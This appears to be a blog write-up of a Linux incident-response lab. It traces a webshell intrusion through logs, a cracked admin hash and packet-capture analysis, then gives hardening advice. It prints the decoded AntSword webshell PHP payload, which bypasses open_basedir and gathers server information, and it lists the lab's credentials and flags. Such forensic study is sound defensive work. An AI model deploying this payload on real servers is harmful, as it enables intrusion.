<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>知攻善防应急靶场-Linux(2) - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/a8937665de3b339ee90310f7187999c0/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="知攻善防应急靶场-Linux(2)">
  <meta property="og:description" content="前言： 堕落了三个月，现在因为被找实习而困扰，着实自己能力不足，从今天开始 每天沉淀一点点 ，准备秋招 加油
注意： 本文章参考qax的网络安全应急响应和知攻善防实验室靶场，记录自己的学习过程，还希望各位博主 师傅 大佬 勿喷，还希望大家指出错误
靶场前言： 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！
靶场要求： （1）提交攻击者IP
（2）提交攻击者修改的管理员密码(明文)
（3）提交第一次Webshell的连接URL
（4）提交Webshell连接密码
（5）提交数据包的flag1
（6）提交攻击者使用的后续上传的木马文件名称
（7）提交攻击者隐藏的flag2
（8）提交攻击者隐藏的flag3
过程： 查看本机网卡
查询管理员最近登录情况命令 grep &#34;Accepted &#34; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39; 根据对比本机IP可以得知该 192.168.20.1即为攻击者的IP，解决（1） 问题，然后照常检查系统有没有运行什么可疑的程序
发现mysql运行了， 这样的话我们就可以去找管理员密码了，目标就很明确了，先去获取数据库密码，然后在www目录的access.log发现路由phpmyadmin
那估计网站搭建数据库是使用了phpmyadmin ,那我们直接去找配置文件config.inc.php就可以
最终在/www/wwwroot/127.0.0.1/lib目录下找到了
得到数据库账号密码
kaoshi: 5Sx8mK5ieyLPb84m 然后登入数据库 查到id为1 的为管理员
寻找id为1 得到密码
得到密码为加密的形式
f6f6eb5ace977d7e114377cc7098b7e3 解码得到：管理员密码（问题2）：Network@2020
我们在root目录下发现了一个 1.pcapng文件 那就的用wireshark进行分析了,直接过滤 攻击者ip ip.addr == 192.168.20.1 然后就看到flag1路径 打开得到flag1(问题5) flag1{Network@_2020_Hack} 然后其他的数据流全是index.php?user-app-register和version2.php ，追踪得到
url解码得到PHP代码
Network2020=@ini_set(&#34;display_errors&#34;, &#34;0&#34;); @set_time_limit(0); $opdir=@ini_get(&#34;open_basedir&#34;); if($opdir) { $ocwd=dirname($_SERVER[&#34;">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-24T21:43:12+08:00">
    <meta property="article:modified_time" content="2024-03-24T21:43:12+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">知攻善防应急靶场-Linux(2)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h4>前言：</h4> 
<blockquote> 
 <p>堕落了三个月，现在因为被找实习而困扰，着实自己能力不足，从今天开始 每天沉淀一点点 ，准备秋招 加油</p> 
</blockquote> 
<h4>注意：</h4> 
<blockquote> 
 <p><br> 本文章参考qax的网络安全应急响应和知攻善防实验室靶场，记录自己的学习过程，还希望各位博主 师傅 大佬 勿喷，还希望大家指出错误</p> 
</blockquote> 
<h4>靶场前言： </h4> 
<blockquote> 
 <p>看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！</p> 
</blockquote> 
<h4>靶场要求： </h4> 
<p>（1）提交攻击者IP<br> （2）提交攻击者修改的管理员密码(明文)<br> （3）提交第一次Webshell的连接URL<br> （4）提交Webshell连接密码<br> （5）提交数据包的flag1<br> （6）提交攻击者使用的后续上传的木马文件名称<br> （7）提交攻击者隐藏的flag2<br> （8）提交攻击者隐藏的flag3</p> 
<h4>过程： </h4> 
<p>查看本机网卡</p> 
<p><img alt="" height="240" src="https://images2.imgbox.com/03/9f/s9o84fss_o.png" width="692"></p> 
<p>查询管理员最近登录情况命令 </p> 
<pre><code class="language-java"> grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</code></pre> 
<p><img alt="" height="133" src="https://images2.imgbox.com/ba/d2/tEAR2Bj2_o.png" width="692"> 根据对比本机IP可以得知该 192.168.20.1即为攻击者的IP，解决（1） 问题，然后照常检查系统有没有运行什么可疑的程序</p> 
<p><img alt="" height="284" src="https://images2.imgbox.com/05/ea/ehWnSKCx_o.png" width="1016"></p> 
<p>发现mysql运行了， 这样的话我们就可以去找管理员密码了，目标就很明确了，先去获取数据库密码，然后在www目录的access.log发现路由phpmyadmin</p> 
<p><img alt="" height="56" src="https://images2.imgbox.com/bc/29/BJYnRoDP_o.png" width="706"></p> 
<p>那估计网站搭建数据库是使用了phpmyadmin ,那我们直接去找配置文件config.inc.php就可以</p> 
<p>最终在/www/wwwroot/127.0.0.1/lib目录下找到了</p> 
<p><img alt="" height="354" src="https://images2.imgbox.com/c2/b9/19cSvK06_o.png" width="891"></p> 
<p>得到数据库账号密码</p> 
<pre><code class="language-java">kaoshi: 5Sx8mK5ieyLPb84m</code></pre> 
<p><img alt="" height="195" src="https://images2.imgbox.com/c1/62/x1bwgaIo_o.png" width="693"></p> 
<p>然后登入数据库 查到id为1 的为管理员</p> 
<p><img alt="" height="84" src="https://images2.imgbox.com/04/fc/muaUOUxi_o.png" width="693"></p> 
<p>寻找id为1 得到密码</p> 
<p><img alt="" height="365" src="https://images2.imgbox.com/c1/90/Ovd1f9Hu_o.png" width="692"> 得到密码为加密的形式</p> 
<pre><code class="language-java">f6f6eb5ace977d7e114377cc7098b7e3</code></pre> 
<p>解码得到：管理员密码（问题2）：Network@2020</p> 
<p><img alt="" height="275" src="https://images2.imgbox.com/d7/00/WCwU2Bep_o.png" width="693"></p> 
<p>我们在root目录下发现了一个 1.pcapng文件 那就的用wireshark进行分析了,直接过滤 攻击者ip  ip.addr == 192.168.20.1 然后就看到flag1路径 打开得到flag1(问题5) </p> 
<pre><code class="language-java">flag1{Network@_2020_Hack}</code></pre> 
<p><img alt="" height="555" src="https://images2.imgbox.com/b1/da/Q4siHJQW_o.png" width="934"></p> 
<p>然后其他的数据流全是<span style="color:#fe2c24;"><code>index.php?user-app-register</code></span>和<span style="color:#fe2c24;"><code>version2.php</code> ，</span><span style="color:#0d0016;">追踪得到</span></p> 
<p><img alt="" height="222" src="https://images2.imgbox.com/2c/fe/MQSkhlOF_o.png" width="1200"></p> 
<p>url解码得到PHP代码</p> 
<pre><code class="language-php">Network2020=@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir=@ini_get("open_basedir");
if($opdir) {
	$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);
	$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);
	@array_push($oparr,$ocwd,sys_get_temp_dir());
	foreach($oparr as $item) {
		if(!@is_writable($item)) {
			continue;
		}
		;
		$tmdir=$item."/.fd491f470fb7";
		@mkdir($tmdir);
		if(!@file_exists($tmdir)) {
			continue;
		}
		$tmdir=realpath($tmdir);
		@chdir($tmdir);
		@ini_set("open_basedir", "..");
		$cntarr=@preg_split("/\\\\|\//",$tmdir);
		for ($i=0;$i&lt;sizeof($cntarr);$i++) {
			@chdir("..");
		}
		;
		@ini_set("open_basedir","/");
		@rmdir($tmdir);
		break;
	}
	;
}
;
;
function asenc($out) {
	return $out;
}
;
function asoutput() {
	$output=ob_get_contents();
	ob_end_clean();
	echo "4a0c"."dc70";
	echo @asenc($output);
	echo "db6"."da5";
}
ob_start();
try {
	$D=dirname($_SERVER["SCRIPT_FILENAME"]);
	if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
	$R="{$D}	";
	if(substr($D,0,1)!="/") {
		foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";
	} else {
		$R.="/";
	}
	$R.="	";
	$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
	$s=($u)?$u["name"]:@get_current_user();
	$R.=php_uname();
	$R.="	{$s}";
	echo $R;
	;
}
catch(Exception $e) {
	echo "ERROR://".$e-&gt;getMessage();
}
;
asoutput();
die();</code></pre> 
<blockquote> 
 <ol><li> <p>代码混淆：该代码使用了一些混淆技术，如函数和变量名的简写、base64 编码和字符串拼接，以增加代码的复杂性和难以理解性。</p> </li><li> <p>文件和目录操作：代码尝试获取脚本所在目录的路径，并在一系列目录中创建临时目录。它还尝试更改 PHP 的 <code>open_basedir</code> 设置，以限制脚本的访问权限。这些操作可能会导致安全风险，特别是对于共享主机环境。</p> </li><li> <p>输出处理：代码使用 <code>ob_start()</code> 和 <code>ob_get_contents()</code> 函数来捕获输出内容，并通过 <code>asenc()</code> 函数进行处理。然后，它将处理后的输出进行拼接和输出。这种输出处理方式是不寻常的，目的和处理过程不清楚。</p> </li><li> <p>系统信息泄露：代码通过调用 <code>php_uname()</code> 函数获取服务器的一些系统信息，如路径和当前用户。这种信息泄露可能会暴露系统的敏感信息。</p> </li><li> <p>潜在的异常处理问题：代码使用了一个异常处理结构，但在异常发生时只是简单地输出了错误消息，并没有实际处理或记录异常。这可能导致问题的隐藏和难以调试。</p> </li></ol> 
</blockquote> 
<p>那就得知了提交第一次Webshell的连接URL为（问题3）</p> 
<pre><code class="language-php">index.php?user-app-register</code></pre> 
<p>根据 Network2020=@ini_set("display_errors", "0"); 就可以知道这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。</p> 
<p><img alt="" height="470" src="https://images2.imgbox.com/6c/11/UYu1IJq0_o.png" width="796"></p> 
<p>所以提交Webshell连接密码为（问题4）</p> 
<pre><code class="language-php">Network2020</code></pre> 
<p>现在我们查看第二个数据包发现最后一行为可执行字符串</p> 
<pre><code class="language-php">x0b6b31b98f31d=TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8=</code></pre> 
<p>因为蚁剑会将参数进行base64编码，然后在最前面随机添加两个字母，所以想知道这个参数是什么应该对<span style="color:#fe2c24;"><code>L3d3dy93d3dyb290LzEyNy4wLjAuMS8=</code></span>进行base64解码，得到参数</p> 
<p><img alt="" height="385" src="https://images2.imgbox.com/60/47/oGBMOAut_o.png" width="677"></p> 
<p>好熟悉 之前咱们的数据库的数据也在这个目录下，那就可以得知攻击在<code>/www/wwwroot/127.0.0.1/</code>目录下创建了<code>flag1</code> 文件并写入flag，然后写入一个新的木马，再改名为<code>version2.php</code>，那么后续访问<code>version2.php</code>的流量包应该就是后续上传的木马文件了 那我们追踪<code>version2.php</code></p> 
<p><img alt="" height="459" src="https://images2.imgbox.com/5f/c3/QYz22wq1_o.png" width="1134"></p> 
<p>一眼冰蝎特征</p> 
<p>参考<a class="link-info" href="https://www.freebuf.com/articles/network/345803.html" rel="nofollow" title="https://www.freebuf.com/articles/network/345803.html">https://www.freebuf.com/articles/network/345803.html</a></p> 
<p><img alt="" height="339" src="https://images2.imgbox.com/84/d4/UDs9ucsX_o.png" width="815"> </p> 
<p>那就可以说明 <code>version2.php就是攻击者后续上传的木马进行getshell了（问题6）</code></p> 
<p>拿到shell了 我们就看看攻击者干了什么 输入 history</p> 
<p>关闭防火墙</p> 
<p><img alt="" height="50" src="https://images2.imgbox.com/71/85/k5xaLcu2_o.png" width="346"></p> 
<p>删除了flag1 和 version2.php 这就和前面的分析对上了</p> 
<p><img alt="" height="267" src="https://images2.imgbox.com/3a/5f/S267UaM2_o.png" width="600"> </p> 
<p>在隐藏目录.api下修改了2个php文件，且得到了flag3（问题8）</p> 
<pre><code class="language-php">flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}</code></pre> 
<p><img alt="" height="290" src="https://images2.imgbox.com/df/f9/Sduw4fzF_o.png" width="698"> 那我们访问修改的php文件,在alinotify.php文件下得到flag2（问题7）</p> 
<p>flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}</p> 
<p><img alt="" height="88" src="https://images2.imgbox.com/bd/e3/RUaz3arU_o.png" width="480"> </p> 
<p>至此，所有任务全部完成</p> 
<p><img alt="" height="635" src="https://images2.imgbox.com/89/e2/dp1ibPsO_o.png" width="842"></p> 
<h4>总结： </h4> 
<p>以下总结为自己思考 ，可能存在某方面不全或者错误，水平有限，还请见谅</p> 
<blockquote> 
 <p>1.该攻击者的IP为192.168.20.1</p> 
 <p>2.攻击方式应该是通过/index.php?user-app-register上传了一个webshell,然后使用蚁剑管理webshell之后再次上传version2.php进行提权.</p> 
 <p>3.攻击者修改了phpmyadmin数据库的管理员密码</p> 
 <p>3.攻击者拿到权限之后 关闭了防火墙服务，并且删除了提权文件version2.php和flag1,并且修改了alinotify.php文件内容 </p> 
 <p>4.并没有发现攻击者留下后门</p> 
</blockquote> 
<h4>清除加固：</h4> 
<blockquote> 
 <p>1.封禁攻击者IP</p> 
 <p>2.经过测验，发现攻击者可通过22端口进行ssh连接，应当更改ssh默认端口或者关闭ssh连接</p> 
 <p>3.修复更改后的文件且还原数据库里面管理员的密码</p> 
 <p>4.对上传的文件 或者字符串进行过滤处理</p> 
 <p>5.对传入的用户数据进行预编译处理＋手动过滤 防止sql注入泄露更改管理员密码</p> 
 <p>6.重启防火墙服务</p> 
 <p>7.关闭某些可以提权的shell函数</p> 
</blockquote>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0f3d6fc2d0e1f320b5afa90339f8122f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">tewa-707e光猫超级密码获取方法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/37c59cf339d4f10f4f76bc1492b83ed9/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">无极低码SQL模板引擎使用教程示例，自己手撸一个sql模板引擎进行动态sql生成。</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>